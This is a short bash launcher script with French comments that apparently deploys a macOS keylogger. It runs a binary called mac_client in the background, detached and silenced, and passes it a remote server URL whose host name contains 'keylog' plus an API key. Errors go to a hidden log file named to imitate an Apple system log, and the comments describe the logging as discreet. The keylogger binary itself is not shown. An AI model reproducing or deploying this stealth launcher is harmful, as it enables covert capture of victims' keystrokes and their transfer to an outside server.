#!/bin/bash

# 1. Récupérer le dossier courant
DIR=$(cd "$(dirname "$0")"; pwd)
BIN="$DIR/mac_client"
SERVER_URL="https://api.keylog.claverie.site"
API_KEY="72UsPl9QtgelVRbJ44u-G6hcNiSIWx64MEOWcmcCQ"

# 2. AUTO-RÉPARATION (Crucial pour le déploiement)
# On force les droits d'exécution au cas où ils auraient sauté
chmod +x "$BIN"

# 3. Logs (discrets)
LOGfile="/tmp/.com.apple.system.debug.log"

# 4. Lancement
if [ -f "$BIN" ]; then
    # On lance en arrière-plan et on se détache
    nohup "$BIN" "$SERVER_URL" "$API_KEY" >/dev/null 2>&1 &
else
    echo "Error: Binary not found at $BIN" >> "$LOGfile"
    exit 1
fi

exit 0
